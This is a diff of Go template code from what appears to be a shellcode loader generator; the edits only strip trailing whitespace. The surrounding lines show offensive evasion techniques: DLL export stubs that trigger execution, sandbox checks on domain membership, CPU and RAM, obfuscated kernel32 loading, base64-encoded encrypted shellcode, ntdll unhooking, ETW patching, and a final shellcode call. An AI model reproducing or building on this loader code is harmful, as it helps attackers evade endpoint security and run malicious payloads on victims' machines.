@@ -6,12 +6,12 @@ func DLL_Export() string {
 	func DllRegisterServer() {
 		Run()
 	}
-	
+
 	//export DllGetClassObject
 	func DllGetClassObject() {
 		Run()
 	}
-	
+
 	//export DllUnregisterServer
 	func DllUnregisterServer() {
 		Run()
@@ -58,7 +58,7 @@ func Sandbox() string {
 			os.Exit(3)
 		}
 	}
-	
+
 	func {{.Variables.DomainJoinedCheck}}() (bool, error) {
 		var {{.Variables.domain}} *uint16
 		var {{.Variables.status}} uint32
@@ -69,7 +69,7 @@ func Sandbox() string {
 		syscall.NetApiBufferFree((*byte)(unsafe.Pointer({{.Variables.domain}})))
 		return {{.Variables.status}} == syscall.NetSetupDomainName, nil
 	}
-	
+
 	func {{.Variables.CPU}}({{.Variables.minCheck}} int64) bool {
 		{{.Variables.num_procs}} := runtime.NumCPU()
 			{{.Variables.minimum_processors_required}} := int({{.Variables.minCheck}})
@@ -78,7 +78,7 @@ func Sandbox() string {
 		}
 		return false
 	}
-	
+
 	func {{.Variables.RAMCheckSize}}({{.Variables.num}} uint64) bool {
 		var {{.Variables.memInfo}} MEMORYSTATUSEX
 			{{.Variables.kernel32}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
@@ -90,8 +90,8 @@ func Sandbox() string {
 		}
 		return false
 	}
-	
-	
+
+
 
 	`
 
@@ -105,8 +105,8 @@ func Encrypt() string {
 		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
 		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
 	}
-	
-	
+
+
 	func {{.Variables.Shellcode}}() {
 	{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.fullciphertext}}")
 
@@ -157,7 +157,7 @@ func Main_Body() string {
 
 	{{.Variables.ImportC}}
 
-	
+
 import (
 	"debug/pe"
 	"encoding/hex"
@@ -346,13 +346,13 @@ func {{.Variables.ETW}}({{.Variables.handlez}} windows.Handle) {
 	{{.Variables.NTDLL}}
 
 	{{.Variables.magic}}("ntdll.dll", {{.Variables.Ntdllbytes}}, {{.Variables.ntdlloffset}}, {{.Variables.ntdllsize}}, {{.Variables.processHandle}})
-	
+
 	stringpid := int({{.Variables.pi}}.ProcessId)
 	p, _ := os.FindProcess(stringpid)
 	p.Kill()
-	{{.Variables.ETWdebug}} 
+	{{.Variables.ETWdebug}}
 	{{.Variables.ETW}}({{.Variables.processHandle}})
-	{{.Variables.Shellcodedebug}} 
+	{{.Variables.Shellcodedebug}}
 	{{.Variables.Shellcode}}()
 }
 
